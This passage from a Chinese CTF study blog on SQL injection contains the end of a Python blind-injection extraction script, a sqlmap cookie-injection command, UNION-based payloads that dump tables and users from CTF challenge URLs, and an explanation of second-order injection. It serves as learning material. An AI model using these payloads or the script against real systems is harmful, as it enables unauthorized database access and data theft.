            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个字段名称的长度"</span><span class="token punctuation">)</span>
            column_length <span class="token operator">=</span> get_column_length<span class="token punctuation">(</span>i<span class="token punctuation">,</span> table<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"个字段的名称"</span><span class="token punctuation">)</span>
            column <span class="token operator">=</span> get_column<span class="token punctuation">(</span>i<span class="token punctuation">,</span> column_length<span class="token punctuation">,</span> table<span class="token punctuation">)</span>
            columns<span class="token punctuation">.</span>append<span class="token punctuation">(</span>column<span class="token punctuation">)</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#在这个循环中可以获取当前选择数据表的所有字段记录</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"现在得到了数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中的以下字段"</span><span class="token punctuation">,</span> columns<span class="token punctuation">)</span>
            column <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请在这些字段中选择一个目标: "</span><span class="token punctuation">)</span>
            <span class="token keyword">while</span><span class="token punctuation">(</span> column <span class="token keyword">not</span> <span class="token keyword">in</span> columns <span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"你输入有误"</span><span class="token punctuation">)</span>
                column <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请重新选择一个目标"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"选择成功，开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的记录数量"</span><span class="token punctuation">)</span>
            flag_num <span class="token operator">=</span> get_flag_num<span class="token punctuation">(</span>column<span class="token punctuation">,</span> table<span class="token punctuation">)</span>
            flags <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> flag_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的"</span><span class="token punctuation">,</span> column<span class="token punctuation">,</span> <span class="token string">"字段的第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"行记录的长度"</span><span class="token punctuation">)</span>
                flag_length <span class="token operator">=</span> get_flag_length<span class="token punctuation">(</span>i<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始获取数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"的"</span><span class="token punctuation">,</span> column<span class="token punctuation">,</span> <span class="token string">"字段的第"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"行记录的内容"</span><span class="token punctuation">)</span>
                flag <span class="token operator">=</span> get_flag<span class="token punctuation">(</span>i<span class="token punctuation">,</span> flag_length<span class="token punctuation">,</span> column<span class="token punctuation">,</span> table<span class="token punctuation">)</span>
                flags<span class="token punctuation">.</span>append<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"---------------------"</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"现在得到了数据表"</span><span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token string">"中"</span><span class="token punctuation">,</span> column<span class="token punctuation">,</span> <span class="token string">"字段中的以下记录"</span><span class="token punctuation">,</span> flags<span class="token punctuation">)</span>
            quit <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"继续切换字段吗？(y/n)"</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>quit <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token keyword">or</span> quit <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
        quit <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"继续切换数据表名吗？(y/n)"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>quit <span class="token operator">==</span> <span class="token string">'n'</span> <span class="token keyword">or</span> quit <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</li>
</ol>
<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ol>
<li><p>  Cookie值将作为where的查询条件</p>
</li>
<li><p>  其实就是<strong>前面的注入测试方法</strong>不再用get传参，而是在Cookie中传参</p>
</li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240430202126.png"></p>
</li>
<li><p>此处介绍使用sqlmap进行Cookie注入的方法</p>
  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://challenge-78e02a607cb3cd96.sandbox.ctfhub.com:10800/"</span> --cookie<span class="token operator">=</span><span class="token string">"id=1"</span> --level <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  使用sqlmap –cookie来检测cookie注入</p>
</li>
<li><p>  同时，可以将等级设置高一些，例如设置为3，不同的等级探测方法不同，3中包含Cookie UA等注入点的探测</p>
</li>
<li><p>  **do you want to try URI injections in the target URL itself? [Y/n/q]**，在url本身中尝试url注入，选了yes</p>
</li>
<li><p>  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]，如果没有发现至少一种其他（潜在）技术，建议仅执行基本的 UNION 测试。你想减少请求的数量吗？yes</p>
</li>
<li><p>  **do you want to URL encode cookie values (implementation specific)? [Y/n]**，是否对cookie值进行url编码，yes</p>
</li>
</ol>
<p>Cookie: id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=’sqli’ limit 0,1–+</p>
<p>uqscbmbwfr        </p>
<p>sayplrawmj</p>
<h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h3 id="例题：sqli-labs38"><a href="#例题：sqli-labs38" class="headerlink" title="例题：sqli-labs38"></a>例题：sqli-labs38</h3><ol>
<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,database() –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135428.png"></li>
<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1) –+      得到一共四个表<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135922.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140048.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140103.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140115.png"></li>
<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select column_name from information_schema.columns where table_name =’users’ limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140251.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140309.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140324.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140334.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140348.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140402.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140415.png"></li>
<li><a target="_blank" rel="noopener" href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select group_concat(id) from security.users limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140627.png"></li>
</ol>
<h4 id="注意是information-schema"><a href="#注意是information-schema" class="headerlink" title="注意是information_schema"></a>注意是information_schema</h4><ol>
<li>是下划线不是点，命名时数字字母下划线，没有点！！！</li>
<li>点表示选择，而information_schema是一个表</li>
</ol>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol>
<li>必须含有<strong>insert</strong>和<strong>update</strong>函数</li>
<li>变量可控<h3 id="原理：-绕过转义注入-魔术引号"><a href="#原理：-绕过转义注入-魔术引号" class="headerlink" title="原理： 绕过转义注入 魔术引号"></a>原理： <strong>绕过转义</strong>注入 魔术引号</h3></li>
<li>已经存储（数据库，文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入</li>
<li>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是<strong>虽然参数在过滤后会添加 “\” 进行转义</strong>，但是<strong>“\”并不会插入到数据库中</strong>，在写入数据库的时候还是<strong>保留了原来的数据</strong>。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中<strong>取出了脏数据</strong>，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</li>
</ol>
<h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><ol>
<li>注册用户（插入数据）：    insert xiaodi union select’</li>
<li>过滤：        xiaodi union select&#39;</li>
<li>进入数据库：  xiaodi union select’</li>
<li>修改用户（修改数据库中的数据）：    update xiaodi union select’ 条件=用户名是谁  xiaodi’ union select update注入</li>
</ol>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol>
<li>插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理（<strong>转义只是为了校验</strong>），在写入数据库时又<strong>还原</strong>了原来的数据</li>
<li>应用恶意数据：开发者默认存入数据库中的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行下一步的校验处理</li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712142916.png"></li>
</ol>
<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ol>
<li>注册用户：insert xiaodi’</li>
<li>修改用户：update</li>
</ol>
<h3 id="二次注入功能点"><a href="#二次注入功能点" class="headerlink" title="二次注入功能点"></a>二次注入功能点</h3><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="过滤函数addslashes"><a href="#过滤函数addslashes" class="headerlink" title="过滤函数addslashes"></a>过滤函数addslashes</h3><ol>
<li>addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是：单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）。</li>
<li>定义：string addslashes ( string $str )</li>
</ol>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="seay"><a href="#seay" class="headerlink" title="seay"></a>seay</h3><ol>
<li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li>
<li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li>
<li>函数查询</li>
<li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li>
</ol>
<h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>搜索select</li>
<li>找到变量</li>
<li>找到变量调用函数</li>
<li>右键定位函数调用位置</li>
<li>看看页面和数据库的互动，根据回显判断注入点</li>
</ol>
<h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol>
<li>看配置文件，看配置文件的关键字，例如：fun、inc</li>
</ol>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io">h3110w0r1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://dezhoutorizhao.github.io/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">http://dezhoutorizhao.github.io/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://dezhoutorizhao.github.io" target="_blank">h3110w0r1d's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a><a class="post-meta__tags" href="/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/">手动注入</a></div><div class="post-share"><div class="social-share" data-image="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="prev-post pull-left" href="/n%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA%E4%B8%AD%E7%AC%ACk%E4%BD%8D%E6%95%B0%E5%AD%97%E6%98%AF%E5%87%A0/" title="n的二进制表示中第k位数字是几"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">n的二进制表示中第k位数字是几</div></div></a><a class="next-post pull-right" href="/mysql%E6%93%8D%E4%BD%9C/" title="mysql操作"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">mysql操作</div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/QQ图片20240111033823.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">h3110w0r1d</div><div class="author-info-description">曲师大DebuGGer战队成员，研究：Web安全、渗透测试、多线程高并发、分布式计算、云计算</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">102</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">49</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">64</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dezhoutorizhao?tab=repositories"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">h3110w0r1d师傅又发布了新博客了，快去看看他学了什么新技术吧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">sql注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">sqlmap使用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#information-schema%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.</span> <span class="toc-text">information_schema的内容</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9information-shcema%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.</span> <span class="toc-text">对information_shcema的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E8%AF%AD%E5%8F%A5%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="toc-number">1.4.</span> <span class="toc-text">SQL语句不区分大小写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9group-concat%E5%92%8Cconcat-ws%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">1.5.</span> <span class="toc-text">对group_concat和concat_ws的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">数字型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E6%9C%89%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.6.1.</span> <span class="toc-text">判断是否有注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-number">1.6.2.</span> <span class="toc-text">判断字段数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">1.6.3.</span> <span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D"><span class="toc-number">1.6.4.</span> <span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%88%97%E5%90%8D"><span class="toc-number">1.6.5.</span> <span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2flag"><span class="toc-number">1.6.6.</span> <span class="toc-text">查询flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">字符型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E8%83%BD%E5%90%A6%E6%A0%B9%E6%8D%AE%E8%BE%93%E5%85%A5%E7%9A%84%E4%B8%8D%E5%90%8C%E7%BB%93%E6%9E%9C%E4%B8%8D%E5%90%8C"><span class="toc-number">1.7.1.</span> <span class="toc-text">判断能否根据输入的不同结果不同</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">1.7.2.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E5%AD%97%E6%AE%B5%E6%95%B0%E9%87%8F"><span class="toc-number">1.7.3.</span> <span class="toc-text">判断字段数量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D-1"><span class="toc-number">1.7.4.</span> <span class="toc-text">爆数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E8%A1%A8%E5%90%8D-1"><span class="toc-number">1.7.5.</span> <span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%E5%86%85%E5%AE%B9"><span class="toc-number">1.7.6.</span> <span class="toc-text">爆字段内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#buuctf%E4%B8%AD%E7%9A%84warmup"><span class="toc-number">1.7.7.</span> <span class="toc-text">buuctf中的warmup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E8%AF%AD%E5%8F%A5%E7%BB%95%E8%BF%87%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.8.</span> <span class="toc-text">万能语句绕过有用户名密码的SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.9.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.9.1.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">1.9.1.1.</span> <span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">1.9.1.2.</span> <span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8database-%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.9.1.3.</span> <span class="toc-text">用database()爆数据库</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#information-schema"><span class="toc-number">2.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#table"><span class="toc-number">3.</span> <span class="toc-text">table</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="toc-number">3.1.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue%E5%87%BD%E6%95%B0%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.1.</span> <span class="toc-text">extractvalue函数原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%8C%E5%A6%82%E6%9E%9C%E9%A1%B5%E9%9D%A2%E5%9B%9E%E6%98%BEsql%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E6%88%91%E4%BB%AC%E6%83%B3%E8%A6%81%E7%9A%84%E4%BF%A1%E6%81%AF%E4%BA%86"><span class="toc-number">3.1.2.</span> <span class="toc-text">而如果页面回显sql报错信息就可以得到我们想要的信息了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BC%E6%8E%A5%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.3.</span> <span class="toc-text">拼接方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue%E5%87%BD%E6%95%B0%E4%B8%80%E6%AC%A1%E5%8F%AA%E8%83%BD%E6%9F%A5%E8%AF%A232%E9%95%BF%E5%BA%A6"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">extractvalue函数一次只能查询32长度</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98ctfshow%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.3.1.1.</span> <span class="toc-text">例题ctfshow报错注入</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.2.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">3.2.1.</span> <span class="toc-text">例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Actfhub%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.2.2.</span> <span class="toc-text">例题：ctfhub布尔盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li 